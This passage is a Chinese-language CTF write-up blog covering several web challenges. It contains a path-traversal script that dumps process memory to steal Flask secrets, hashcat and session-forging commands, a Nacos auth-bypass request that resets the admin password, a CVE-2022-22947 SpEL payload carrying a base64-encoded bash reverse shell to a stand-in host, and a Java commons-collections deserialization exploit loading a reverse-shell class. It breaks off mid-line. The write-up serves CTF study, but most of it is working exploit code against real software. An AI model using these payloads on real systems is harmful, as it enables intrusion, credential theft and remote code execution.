class="string">&#x27;/books&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">book_page</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;book&#x27;</span>):</span><br><span class="line">        book = request.args.get(<span class="string">&#x27;book&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> session:</span><br><span class="line">        book = session.get(<span class="string">&#x27;book&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, books=books, message=<span class="string">&#x27;I need book&#x27;</span>)</span><br><span class="line">    book=book.replace(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    filepath = <span class="string">&#x27;./books/&#x27;</span> + book</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;page_size&#x27;</span>):</span><br><span class="line">        page_size = <span class="built_in">int</span>(request.args.get(<span class="string">&#x27;page_size&#x27;</span>))</span><br><span class="line">    <span class="keyword">elif</span> session:</span><br><span class="line">        page_size = <span class="built_in">int</span>(session.get(<span class="string">&#x27;page_size&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page_size = <span class="number">3000</span></span><br><span class="line"></span><br><span class="line">    total_pages = math.ceil(os.path.getsize(filepath) / page_size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;page&#x27;</span>):</span><br><span class="line">        page = <span class="built_in">int</span>(request.args.get(<span class="string">&#x27;page&#x27;</span>))</span><br><span class="line">    <span class="keyword">elif</span> session:</span><br><span class="line">        page = <span class="built_in">int</span>(session.get(<span class="string">&#x27;page&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="number">1</span></span><br><span class="line">    words = read_file_page(filepath, page, page_size)</span><br><span class="line">    prev_page = page - <span class="number">1</span> <span class="keyword">if</span> page &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    next_page = page + <span class="number">1</span> <span class="keyword">if</span> page &lt; total_pages <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    session[<span class="string">&#x27;book&#x27;</span>] = book</span><br><span class="line">    session[<span class="string">&#x27;page&#x27;</span>] = page</span><br><span class="line">    session[<span class="string">&#x27;page_size&#x27;</span>] = page_size</span><br><span class="line">    session[<span class="string">&#x27;total_pages&#x27;</span>] = total_pages</span><br><span class="line">    session[<span class="string">&#x27;prev_page&#x27;</span>] = prev_page</span><br><span class="line">    session[<span class="string">&#x27;next_page&#x27;</span>] = next_page</span><br><span class="line">    session[<span class="string">&#x27;filepath&#x27;</span>] = filepath</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, books=books, words=words )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> hashlib.md5(session.get(<span class="string">&#x27;key&#x27;</span>).encode()).hexdigest() == key:</span><br><span class="line">        <span class="keyword">return</span> os.popen(<span class="string">&#x27;/readflag&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no no no&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file_page</span>(<span class="params">filename, page_number, page_size</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            size=page_size + j</span><br><span class="line">            offset = (page_number - <span class="number">1</span>) * page_size+i</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                    file.seek(offset)</span><br><span class="line">                    words = file.read(size)</span><br><span class="line">                    <span class="keyword">return</span> words.decode().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="comment">#if error again</span></span><br><span class="line">            offset = (page_number - <span class="number">1</span>) * page_size</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                file.seek(offset)</span><br><span class="line">                words = file.read(page_size)</span><br><span class="line">            <span class="keyword">return</span> words.split(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="string">&#x27;8000&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æœ‰&#x2F;readflagï¼Œæ‰€ä»¥ç›´æ¥è¯»&#x2F;flagä¸å¯å–</p><p>çœ‹ä»£ç </p><p>éœ€è¦è·å–åˆ°<code>secret_key</code>å’Œ<code>key</code>è¿™ä¸¤ä¸ªmd5çš„å€¼ï¼Œç„¶åç”¨flasksessionå»ä¼ªé€ </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.secret_key = hashlib.md5(os.urandom(<span class="number">32</span>)).hexdigest()</span><br><span class="line">key = hashlib.md5(<span class="built_in">str</span>(time.time_ns()).encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> hashlib.md5(session.get(<span class="string">&#x27;key&#x27;</span>).encode()).hexdigest() == key:</span><br><span class="line">        <span class="keyword">return</span> os.popen(<span class="string">&#x27;/readflag&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no no no&quot;</span></span><br></pre></td></tr></table></figure><p>è§£é¢˜ï¼š</p><ol><li>è¯»<code>/proc/self/maps</code>è·å–å†…å­˜åœ°å€</li><li>ä»<code>/proc/self/mem</code>è¯»å–æŒ‡å®šåç§»çš„å†…å­˜æ•°æ®</li><li>æ‰¾<code>secret_key</code>å’Œ<code>key</code></li><li>ä¼ªé€ session</li></ol><p><strong>mem.py</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,requests,re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dowload</span>(<span class="params">file,offset=<span class="number">0</span>,length=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> offset:</span><br><span class="line">        page = <span class="built_in">int</span>(offset) // <span class="built_in">int</span>(length)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>books?book=.../.../.../.../...<span class="subst">&#123;file&#125;</span>&amp;page=<span class="subst">&#123;<span class="built_in">str</span>(page)&#125;</span>&amp;page_size=<span class="subst">&#123;length&#125;</span>&quot;</span>)</span><br><span class="line">        res=requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>books?book=.../.../.../.../...<span class="subst">&#123;file&#125;</span>&amp;page=<span class="subst">&#123;<span class="built_in">str</span>(page)&#125;</span>&amp;page_size=<span class="subst">&#123;length&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>books?book=.../.../.../.../...<span class="subst">&#123;file&#125;</span>&amp;page=1&amp;page_size=2000000000&quot;</span>)</span><br><span class="line">    text=res.text</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://x.x.x.x:9703/&quot;</span></span><br><span class="line"></span><br><span class="line">maps = <span class="built_in">open</span>(<span class="string">f&#x27;maps&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">maps.write(dowload(<span class="string">&quot;/proc/self/maps&quot;</span>).encode())</span><br><span class="line">maps.close()</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;rm -rf ./save;mkdir save&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;maps&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read().split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.so&quot;</span> <span class="keyword">in</span> i <span class="keyword">or</span> <span class="string">&quot;lib&quot;</span> <span class="keyword">in</span> i o<span class="string">r&quot;python3&quot;</span> <span class="keyword">in</span> i o<span class="string">r&quot;dev&quot;</span> <span class="keyword">in</span> i:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    t = re.search(<span class="string">r&#x27;[0-9a-f]&#123;12&#125;-[0-9a-f]&#123;12&#125;&#x27;</span>, i)</span><br><span class="line">    <span class="keyword">if</span> t:</span><br><span class="line">        location = t.group().split(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        start, end=<span class="string">&quot;0x&quot;</span>+location[<span class="number">0</span>],<span class="string">&quot;0x&quot;</span>+location[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;./save/&quot;</span>+start+<span class="string">&quot;-&quot;</span>+end)</span><br><span class="line">    save = <span class="built_in">open</span>(</span><br><span class="line">        <span class="string">&quot;./save/&quot;</span>+start+<span class="string">&quot;-&quot;</span>+end,<span class="string">&quot;wb&quot;</span></span><br><span class="line">    )</span><br><span class="line">    save.write(</span><br><span class="line">        dowload(</span><br><span class="line">            <span class="string">&quot;/proc/self/mem&quot;</span>,</span><br><span class="line">            <span class="built_in">str</span>(<span class="built_in">int</span>(start,<span class="number">16</span>)),</span><br><span class="line">            <span class="built_in">str</span>(<span class="built_in">int</span>(end,<span class="number">16</span>)-<span class="built_in">int</span>(start,<span class="number">16</span>))</span><br><span class="line">        ).encode()</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>å®Œæˆåç”¨æ­£åˆ™åŒ¹é…å»æ‰¾ä¸¤ä¸ªæ‰€éœ€çš„md5å€¼</p><p><a href="https://imgse.com/i/pC9x9ne"><img src="https://s1.ax1x.com/2023/06/04/pC9x9ne.png" alt="pC9x9ne.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">secret_keyï¼š1dd6f6c7248200af71c1e061af0fc31f</span><br><span class="line"></span><br><span class="line">keyï¼š08674b5fc247b8b13d2b8e5517079d48</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨å¯åŠ¨é¶æœºæ—¶å¤šæ‰“å°å‡ æ¬¡å½“å‰è¡Œæ—¶é—´æˆ³ï¼Œä»¥å‡å°‘ç¢°æ’èŒƒå›´</p><p><strong>time.py</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(time.time_ns())</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2023/06/04/pC9x1Nn.png" alt="pC9x1Nn.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hashcat -m 0 -a 3 &quot;08674b5fc247b8b13d2b8e5517079d48&quot; &quot;168588107?d?d?d?d?d?d?d?d?d?d&quot;</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pC9xktI"><img src="https://s1.ax1x.com/2023/06/04/pC9xktI.png" alt="pC9xktI.png"></a></p><p>æœ€åä¼ªé€ sessionå°±è¡Œäº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s <span class="string">&quot;1dd6f6c7248200af71c1e061af0fc31f&quot;</span> -t <span class="string">&quot;&#123;&#x27;key&#x27;:&#x27;1685881072130406288&#x27;&#125;&quot;</span></span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pC9xs9x"><img src="https://s1.ax1x.com/2023/06/04/pC9xs9x.png" alt="pC9xs9x.png"></a></p><p><a href="https://imgse.com/i/pC9xung"><img src="https://s1.ax1x.com/2023/06/04/pC9xung.png" alt="pC9xung.png"></a></p><h2 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h2><p>æä¾›çš„dumpåœ¨ç»ˆç«¯é‡Œé¢ æ˜¯mysql dump -u ç”¨æˆ·å   -p å¯†ç  æ•°æ®åº“ è¡¨  è¿™é‡Œå¯æ§çš„æ˜¯æ•°æ®åº“ å’Œè¡¨ ï¼Œ%0A  æ¢è¡Œå¯æ‰§è¡Œå‘½ä»¤ ä½†æ˜¯flagæ²¡æƒé™è¯»ï¼Œè¯»ä¸€ä¸‹ENVç›´æ¥éé¢„æœŸäº†</p><p><a href="https://imgse.com/i/pC9xcjO"><img src="https://s1.ax1x.com/2023/06/04/pC9xcjO.png" alt="pC9xcjO.png"></a></p><h2 id="BackendService"><a href="#BackendService" class="headerlink" title="BackendService"></a>BackendService</h2><p>å‚è€ƒ<a href="https://xz.aliyun.com/t/11493#toc-2">Nacosç»“åˆSpring Cloud Gateway RCEåˆ©ç”¨</a></p><p>nacosè®¤è¯ç»•è¿‡ï¼ŒCVE-2021-29441</p><p>å¯ä»¥ä¿®æ”¹nacosç”¨æˆ·å¯†ç ï¼Œä¹Ÿå°±æ˜¯ç®¡ç†å‘˜å¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PUT /nacos/v1/auth/users</span><br><span class="line"></span><br><span class="line">username=nacos&amp;newPassword=123456</span><br></pre></td></tr></table></figure><p>ç™»é™†åå°åå‘ç°å¼€äº†ä¸€ä¸ª<strong>Spring Cloud Gateway</strong>æœåŠ¡ï¼Œ è¿™ä¸ªæœåŠ¡å­˜åœ¨ä¸€ä¸ª<code>CVE-2022-22947</code>ï¼ŒSPELæ³¨å…¥rce</p><p>é¢˜ç›®ç»™äº†ä¸ªjaråŒ…ï¼Œä¸ä¸Šé¢å‚è€ƒæ–‡ç« å”¯ä¸€ä¸åŒçš„åœ°æ–¹å°±æ˜¯Data IDä¸º <code>backcfg</code> åŒæ—¶å†…å®¹ç”±yamlå½¢å¼æ”¹ä¸ºäº†json æ ¼å¼</p><p>ç›´æ¥åå¼¹hellå°±è¡Œäº†ï¼Œç‚¹å‡»å‘å¸ƒæ—¶å°±å¼¹è¿‡æ¥äº†</p><p><a href="https://imgse.com/i/pCCsf5q"><img src="https://s1.ax1x.com/2023/06/05/pCCsf5q.png" alt="pCCsf5q.png"></a></p><p><strong>Exp</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;spring&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;cloud&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;gateway&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;routes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;exam&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;order&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lb://service-provider&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;predicates&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                            <span class="string">&quot;Path=/echo/**&quot;</span></span><br><span class="line">                        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;filters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                            <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AddResponseHeader&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;result&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                    <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;bash&#x27;, &#x27;-c&#x27;, &#x27;echo YmFzaCAtaSA+JiAvZGV2L3RjcC9odHRwOi8vdnBzL3BvcnQgMD4mMQ==|base64 -d|bash&#x27;&#125;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;</span></span><br><span class="line">                                <span class="punctuation">&#125;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">]</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pC9zqRx"><img src="https://s1.ax1x.com/2023/06/04/pC9zqRx.png" alt="pC9zqRx.png"></a></p><h2 id="DeSerbug"><a href="#DeSerbug" class="headerlink" title="DeSerbug"></a>DeSerbug</h2><p>Youä¸¤ä¸ªä¾èµ–ï¼Œ<code>commons-collections3.2.2</code>å’Œ<code>hutool5.8.18</code>ï¼Œæ”¹é€ ccé“¾</p><p><code>commons-collections3.2.2</code>banæ‰äº†å¤§é‡3.2.1ä¸­å¯¼è‡´ååºåˆ—åŒ–çš„æ¶æ„ç±»ï¼Œä½†é¢˜ç›®ç»™äº†ä¸ª<code>Myexpect</code>ç±»ï¼Œå…¶ä¸­çš„<code>getAnyexcept</code>å¯ä»¥å®ä¾‹åŒ–ä»»æ„ä¸€ä¸ªå•å‚æ•°çš„ç±»ï¼Œä¸éš¾æƒ³åˆ°ccé“¾ä¸­<code>TrAXFilter</code>ç±»ï¼Œæ­£æ˜¯è¿™ä¸ªç±»å¯¼è‡´äº†<code>TemplatesImpl</code>çš„å®ä¾‹åŒ–ï¼Œä»è€Œå¯¼è‡´äº†æ¶æ„å­—èŠ‚ç æ³¨å…¥</p><p><a href="https://imgse.com/i/pCCcEgf"><img src="https://s1.ax1x.com/2023/06/05/pCCcEgf.png" alt="pCCcEgf.png"></a></p><p>æ€ä¹ˆè°ƒç”¨åˆ°<code>getAnyexcept</code>,åé¢ç»™äº†hint</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</span><br></pre></td></tr></table></figure><p>ä¸‹é¢ä¸€å±‚ä¸€å±‚å¾€ä¸Šçœ‹å°±è¡Œäº†</p><p><code>LazyMap#get</code>&#x3D;&gt;<code>put</code></p><p><a href="https://imgse.com/i/pCCgKsO"><img src="https://s1.ax1x.com/2023/06/05/pCCgKsO.png" alt="pCCgKsO.png"></a></p><p><code>TiedMapEntry#toString</code>&#x3D;&gt;<code>TiedMapEntry#getValue</code>&#x3D;&gt;<code>LazyMap#get</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Testapp</code>&#x3D;&gt;<code>TiedMapEntry#toString</code></p><p><a href="https://imgse.com/i/pCCgay8"><img src="https://s1.ax1x.com/2023/06/05/pCCgay8.png" alt="pCCgay8.png"></a></p><p><strong>gadget</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Testapp</span><br><span class="line">TiedMapEntry#toString</span><br><span class="line"> TiedMapEntry#toString</span><br><span class="line">TiedMapEntry#getValue</span><br><span class="line">LazyMap#get</span><br><span class="line">Myexcept#getAnyexcept</span><br><span class="line">TrAXFilter#TrAXFilter</span><br><span class="line">TemplatesImpl</span><br></pre></td></tr></table></figure><p><strong>Exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.app;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;Path\\to\\Evil.class&quot;</span>)); <span class="comment">//åå¼¹shell</span></span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Myexpect</span> <span class="variable">myexpect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myexpect</span>();</span><br><span class="line"></span><br><span class="line">        myexpect.setTargetclass(TrAXFilter.class);</span><br><span class="line">        myexpect.setTypearg(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123; templates&#125;);</span><br><span class="line">        myexpect.setTypeparam(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123; Templates.class &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 